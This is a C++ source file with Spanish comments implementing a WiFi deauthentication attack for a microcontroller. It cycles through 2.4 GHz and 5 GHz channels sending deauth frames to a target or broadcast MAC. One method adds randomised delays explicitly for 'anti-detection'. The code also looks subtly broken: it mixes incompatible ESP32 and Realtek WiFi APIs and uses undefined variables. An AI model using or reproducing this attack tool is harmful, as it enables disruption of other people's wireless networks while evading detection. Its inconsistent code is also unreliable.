#include "WiFiDeauth.h"
#include <WiFi.h>
#include <wl_definitions.h>

// MAC objetivo por defecto (broadcast)
const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// Canales WiFi (2.4GHz y 5GHz)
const uint8_t channels_24ghz[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const uint8_t channels_5ghz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};

bool WiFiDeauth::init() {
    WiFi.mode(WIFI_OFF); // Desactiva WiFi estándar
    if (esp_wifi_init(&cfg) != ESP_OK) {
        Serial.println("[ERROR] Fallo al inicializar WiFi");
        return false;
    }
    return true;
}

void WiFiDeauth::start(bool is_5ghz, uint8_t* target_mac) {
    const uint8_t* channels = is_5ghz ? channels_5ghz : channels_24ghz;
    int num_channels = is_5ghz ? sizeof(channels_5ghz) / sizeof(channels_5ghz[0]) : sizeof(channels_24ghz) / sizeof(channels_24ghz[0]);

    for (int i = 0; i < num_channels; i++) {
        set_channel(channels[i]);
        send_deauth(target_mac ? target_mac : broadcast_mac);
        Serial.printf("[DEAUTH] %s - Canal %d\n", is_5ghz ? "5GHz" : "2.4GHz", channels[i]);
        delay(50); // Ajustable para evitar saturación
    }
}

// ----- Métodos Privados -----
void WiFiDeauth::set_channel(uint8_t channel) {
    if (wext_set_channel(WLAN0_NAME, channel) != 0) {
        Serial.printf("[ERROR] Canal %d no válido\n", channel);
    }
}

void WiFiDeauth::send_deauth(uint8_t* mac) {
    wifi_tx_deauth_frame(mac, broadcast_mac, 0x0002); // Reason: Auth expired
    // Verificación de error (opcional)
    // if (esp_wifi_80211_tx(..., ...) != ESP_OK) {...}
}

void WiFiDeauth::attack(bool is_5ghz, uint8_t* mac) {
    const uint8_t* channels = is_5ghz ? channels_5ghz : channels_24ghz;
    int num_channels = is_5ghz ? sizeof(channels_5ghz)/sizeof(channels_5ghz[0]) : 13;

    for (int i = 0; i < num_channels; i++) {
        if (is_5ghz && (channels[i] >= 120 && channels[i] <= 128)) continue; // Evita DFS
        
        wext_set_channel("wlan0", channels[i]);
        if (wifi_send_pkt_freedom(deauth_frame, 26, 0) != 0) {
            Serial.printf("[ERROR] Canal %d falló\n", channels[i]);
        }
        delay(random(50, 200)); // Anti-detección
    }
}
